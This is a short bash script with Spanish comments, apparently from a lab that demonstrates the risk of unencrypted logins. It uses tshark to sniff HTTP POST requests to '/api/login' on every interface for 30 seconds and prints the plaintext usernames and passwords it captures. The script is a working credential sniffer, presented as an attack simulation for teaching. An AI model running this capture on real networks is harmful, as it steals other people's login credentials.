#!/bin/bash
# Simulación de un Atacante realizando un ataque de intermediario (Sniffing)
# Este script roba las credenciales en texto plano que pasan por la red HTTP

echo "[!] INICIANDO INTERCEPCIÓN DE RED (ATACANTE) [!]"
echo "Escuchando en la interfaz 'any' por paquetes HTTP POST con credenciales..."
echo "Esperando a que el cliente inicie sesión (Ejecuta 'make simulate-client' en otra terminal)..."

# Usamos tshark para leer el tráfico HTTP y extraer el JSON con las contraseñas
# Captura de paquetes por 30 segundos
tshark -i any -Y 'http.request.method == "POST" && http.request.uri == "/api/login"' -T fields -e text -a duration:30 2>/dev/null | grep -o '{"username":[^}]*}' | while read -r line; do
    echo "---------------------------------------------------"
    echo "[☠️] ¡CREDENCIALES INTERCEPTADAS EN TEXTO PLANO! [☠️]"
    echo "$line" | jq '.'
    echo "---------------------------------------------------"
done

echo "[!] FIN DE LA INTERCEPCIÓN [!]"
